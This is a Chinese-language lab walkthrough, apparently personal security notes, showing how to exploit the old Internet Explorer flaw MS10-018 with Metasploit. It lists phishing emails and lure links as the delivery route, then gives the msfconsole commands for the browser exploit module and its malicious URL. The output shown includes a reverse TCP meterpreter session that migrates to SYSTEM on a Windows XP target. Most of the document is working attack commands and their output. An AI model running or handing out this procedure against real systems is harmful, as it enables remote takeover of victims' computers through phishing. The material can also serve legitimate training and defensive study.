### 1、漏洞覆盖系统范围
```shell script
IE 5,6,7,8
试用范围：
    钓鱼邮件，诱惑链接
```
https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-018
### 2、进入msf终端
```shell script
┌──(rootli)-[~]
└─# msfconsole
```
### 3、搜索漏洞框架
```shell script
msf6 > search ms10_018

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank  Check  Description
   -  ----                                                 ---------------  ----  -----  -----------
   0  exploit/windows/browser/ms10_018_ie_behaviors        2010-03-09       good  No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   1  exploit/windows/browser/ms10_018_ie_tabular_activex  2010-03-09       good  No     MS10-018 Microsoft Internet Explorer Tabular Data Control ActiveX Memory Corruption


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/browser/ms10_018_ie_tabular_activex
```
### 4、设置相关参数
```shell script
msf6 > use exploit/windows/browser/ms10_018_ie_behaviors
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/browser/ms10_018_ie_behaviors) > set srvhost 172.16.120.177  # 设置web服务器的地址，在是kali本机
sevhost => 172.16.120.177
msf6 exploit(windows/browser/ms10_018_ie_behaviors) > set uripath liuxiang  # 设置访问的url
uripath => liuxiang
msf6 exploit(windows/browser/ms10_018_ie_behaviors) > options   # 查看配置
```
![image](https://github.com/498946975/Security/blob/master/images/ms10-18_1.png)
### 5、监听攻击
```shell script
msf6 exploit(windows/browser/ms10_018_ie_behaviors) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.120.177:4444 
msf6 exploit(windows/browser/ms10_018_ie_behaviors) > [*] Using URL: http://172.16.120.177:8080/liuxiang
[*] Server started.
[*] Sending stage (175174 bytes) to 172.16.120.141
[*] Session ID 1 (172.16.120.177:4444 -> 172.16.120.141:1763 ) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Current session process is notepad.exe (1712) as: OLIVER-FE713730\Administrator
[*] Session is Admin but not System.
[*] Will attempt to migrate to specified System level process.
[*] Trying services.exe (728)
[+] Successfully migrated to services.exe (728) as: NT AUTHORITY\SYSTEM
[*] Meterpreter session 1 opened (172.16.120.177:4444 -> 172.16.120.141:1763 ) at 2022-01-18 16:02:00 +0800
```
### 6、xp机器访问对应的URL http://172.16.120.177:8080/liuxiang ;访问之后会闪退
### 7、成功闪退之后，在kali上查看session
```shell script
sessions -l

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x86/windows  OLIVER-FE713730\Administrator   172.16.120.177:4444 -> 172.16.
                                     @ OLIVER-FE713730               120.141:1763  (172.16.120.141)
  2         meterpreter x86/windows  OLIVER-FE713730\Administrator   172.16.120.177:4444 -> 172.16.
                                     @ OLIVER-FE713730               120.141:1773  (172.16.120.141)
  3         meterpreter x86/windows  OLIVER-FE713730\Administrator   172.16.120.177:4444 -> 172.16.
                                     @ OLIVER-FE713730               120.141:1779  (172.16.120.141)
```
### 8、进入被控主机
```shell script
msf6 exploit(windows/browser/ms10_018_ie_behaviors) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > pwd
C:\WINDOWS\system32
```